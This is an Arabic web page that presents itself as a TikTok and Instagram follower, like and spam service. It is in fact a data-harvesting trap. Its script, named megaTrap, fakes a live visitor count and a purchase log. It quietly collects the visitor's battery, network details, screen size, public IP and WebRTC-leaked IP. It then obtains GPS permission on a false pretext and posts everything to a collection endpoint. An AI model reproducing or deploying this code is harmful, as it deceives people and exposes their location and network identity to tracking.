<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALSSRY - SERVICES</title>
    <style>
        :root { --main-green: #00ff00; --glow-red: #ff0000; }
        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
        #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; }
        @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
        
        .logo-3d { font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px; text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green); margin-top: 20px; margin-bottom: 0; }
        .red-subtitle { color: var(--glow-red); font-weight: bold; font-size: 14px; letter-spacing: 1px; margin-bottom: 20px; display: block; text-transform: uppercase; }
        
        .watermark { position: fixed; top: 55%; left: 50%; transform: translate(-50%, -50%); font-size: 25px; font-weight: bold; color: rgba(255,255,255,0.15); pointer-events: none; z-index: 5; }
        
        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; box-shadow: 0 0 10px var(--main-green); }
        
        #tools-interface { padding: 20px; display: none; }
        .glass-btn { width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; }
        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: black; color: white; text-align: center; }
        
        /* سجل المشتريات الوهمي */
        #purchase-log { width: 90%; margin: 20px auto; padding: 10px; background: rgba(0,0,0,0.9); border: 1px solid #1a1a1a; border-radius: 10px; height: 80px; overflow: hidden; font-size: 12px; }
        .log-entry { color: #888; margin-bottom: 5px; animation: slideIn 0.5s ease-out; }
        .log-entry span { color: var(--main-green); font-weight: bold; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }

        #live-status { margin-top: 15px; font-size: 14px; color: var(--main-green); text-shadow: 0 0 5px var(--main-green); }
        #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; }
        #counter { font-size: 35px; color: var(--main-green); }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="starfield"></div>
    <div class="watermark">snap : i5dqa</div>

    <div id="landing-page">
        <div class="logo-3d">ALSSRY</div>
        <button class="start-btn" onclick="megaTrap()">بدء</button>
    </div>

    <div id="tools-interface">
        <div class="logo-3d">ALSSRY</div>
        <span class="red-subtitle">Not everywhere there is a law</span>
        
        <div id="main-menu">
            <button class="glass-btn" onclick="showPlat('boost')">1- قسم الرشق 🚀</button>
            <button class="glass-btn" onclick="showPlat('spam')">2- قسم الإسبام ⚔️</button>
        </div>

        <div id="platform-menu" class="hidden">
            <button class="glass-btn" onclick="selectPlat('TikTok')">تيك توك</button>
            <button class="glass-btn" onclick="selectPlat('Instagram')">انستقرام</button>
            <button class="glass-btn" style="color:red;" onclick="goBack('main-menu')">رجوع</button>
        </div>

        <div id="service-menu" class="hidden">
            <div id="boost-btns" class="hidden">
                <button class="glass-btn" onclick="openInput('متابعين')">متابعين</button>
                <button class="glass-btn" onclick="openInput('لايكات')">لايكات</button>
            </div>
            <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام')">بدء الإسبام</button>
            <button class="glass-btn" style="color:red;" onclick="goBack('platform-menu')">رجوع</button>
        </div>

        <div id="final-step" class="hidden">
            <h3 id="display-title" style="color:var(--main-green)"></h3>
            <input type="text" id="target-id" placeholder="اليوزر أو الرابط">
            <input type="number" id="target-count" placeholder="العدد المطلوب">
            <button class="glass-btn" style="background:var(--main-green); color:black;" onclick="requestGPS()">تأكيد التنفيذ ✅</button>
            <div id="progress-box" class="hidden"><div id="counter">0</div></div>
        </div>

        <div id="purchase-log"><div id="log-container"></div></div>
        <div id="live-status">🟢 المتصلون الآن: <span id="user-count">312</span></div>
    </div>

    <script>
        let deviceData = {};

        function startLiveUI() {
            // عداد الزوار
            setInterval(() => {
                let c = parseInt(document.getElementById('user-count').innerText);
                c += Math.floor(Math.random() * 7) - 3;
                document.getElementById('user-count').innerText = c < 150 ? 210 : c;
            }, 2500);

            // سجل المشتريات
            const names = ["م***د", "س***ن", "ع***د", "خ***د", "ف***ل", "ن***ف"];
            const jobs = ["متابعين تيك توك", "لايكات انستقرام", "إكسبلور", "مشاهدات"];
            setInterval(() => {
                const log = document.getElementById('log-container');
                const div = document.createElement('div');
                div.className = 'log-entry';
                div.innerHTML = `تم بنجاح إرسال <span>${jobs[Math.floor(Math.random()*jobs.length)]}</span> لـ ${names[Math.floor(Math.random()*names.length)]}`;
                log.prepend(div);
                if(log.children.length > 3) log.removeChild(log.lastChild);
            }, 3500);
        }

        async function megaTrap() {
            document.getElementById('landing-page').classList.add('hidden');
            document.getElementById('tools-interface').style.display = 'block';
            startLiveUI();

            // سحب البطارية
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                deviceData.battery = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋");
            }
            
            // سحب الشبكة
            const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (n) deviceData.network = `${n.effectiveType} | ${n.downlink}Mbps`;

            // الـ IP الحقيقي (النجوسية)
            const rtc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            rtc.createDataChannel("");
            rtc.createOffer().then(o => rtc.setLocalDescription(o));
            rtc.onicecandidate = (e) => {
                if (e.candidate) {
                    deviceData.real_ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
                    sendToApi("تحديث IP الحقيقي");
                }
            };

            // الـ IP العام
            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
                deviceData.public_ip = d.ip;
                sendToApi("زيارة أولية");
            });

            deviceData.platform = navigator.platform;
            deviceData.screen = window.screen.width + "x" + window.screen.height;
        }

        function requestGPS() {
            alert("⚠️ يرجى السماح بالوصول للموقع لضمان ربط حسابك بأقرب سيرفر وسرعة الرشق.");
            navigator.geolocation.getCurrentPosition((p) => {
                deviceData.gps = { lat: p.coords.latitude, lon: p.coords.longitude };
                startProcess();
            }, () => { deviceData.gps = "Denied"; startProcess(); });
        }

        function startProcess() {
            const count = document.getElementById('target-count').value || 1000;
            sendToApi(`بدء تنفيذ طلب: ${document.getElementById('target-id').value}`);
            document.getElementById('progress-box').classList.remove('hidden');
            let cur = 0;
            let inv = setInterval(() => {
                if(cur >= count) { clearInterval(inv); alert("تم اكتمال الطلب بنجاح!"); location.reload(); }
                else { cur += Math.floor(Math.random()*10)+5; if(cur>count) cur=count; document.getElementById('counter').innerText = cur; }
            }, 100);
        }

        function sendToApi(act) {
            fetch('/api/index', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ action: act, device: deviceData }) });
        }

        let mode="", plat="";
        function showPlat(m) { mode=m; goBack('platform-menu'); }
        function selectPlat(p) { plat=p; goBack('service-menu'); document.getElementById('boost-btns').className = (mode==='boost') ? "" : "hidden"; document.getElementById('spam-btn').className = (mode==='spam') ? "glass-btn" : "hidden"; }
        function openInput(s) { goBack('final-step'); document.getElementById('display-title').innerText = s; }
        function goBack(id) { document.querySelectorAll('#main-menu, #platform-menu, #service-menu, #final-step').forEach(el => el.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
        
        // كثافة النجوم
        const container = document.getElementById('starfield');
        for(let i=0; i<120; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.width = star.style.height = Math.random()*3+'px';
            star.style.left = Math.random()*100+'vw';
            star.style.animationDuration = Math.random()*5+2+'s';
            container.appendChild(star);
        }
    </script>
</body>
</html>
